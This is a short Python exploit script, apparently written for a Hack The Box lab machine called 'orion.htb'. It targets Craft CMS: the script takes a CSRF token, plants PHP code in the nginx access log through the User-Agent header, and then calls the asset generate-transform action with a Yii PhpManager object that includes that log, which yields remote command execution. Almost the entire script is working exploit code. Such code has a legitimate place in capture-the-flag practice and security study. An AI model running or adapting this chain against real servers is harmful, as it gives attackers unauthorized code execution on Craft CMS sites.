#!/usr/bin/env python3
import requests, socket, urllib3, re, base64, time

urllib3.disable_warnings()

_orig = socket.getaddrinfo
def p(h, *a, **kw):
    return _orig("10.129.244.146" if h == "orion.htb" else h, *a, **kw)
socket.getaddrinfo = p

s = requests.Session()
s.verify = False

# Get CSRF
r = s.get("http://orion.htb/actions/users/session-info", headers={"Accept": "application/json"})
csrf = r.json()["csrfTokenValue"]
print("[+] CSRF acquired")

# 1. First test: simple id command
php1 = "<?php system('id');?>"
print(f"[+] Poison with: {php1}")
r = s.get("http://orion.htb/", headers={"User-Agent": php1})
time.sleep(0.5)

# 2. Trigger
data = [("CRAFT_CSRF_TOKEN", csrf),("assetId", "2"),("handle[width]", "1"),("handle[height]", "1"),("handle[as x][class]", "yii\\rbac\\PhpManager"),("handle[as x][itemFile]", "/var/log/nginx/access.log")]
r = s.post("http://orion.htb/actions/assets/generate-transform", data=data)

# 3. Search for uid= in response
if "uid=" in r.text:
    print("[!] RCE SUCCESS!")
    # Extract the line containing uid=
    for line in r.text.split("\n"):
        if "uid=" in line:
            print(line[:300])
            break
else:
    print("[-] uid= not found in response")
    print(f"Response length: {len(r.text)}")
    # Save response
    with open("/mnt/c/HTB/Orion/http/E30_id_response.txt", "w") as f:
        f.write(r.text[:10000])
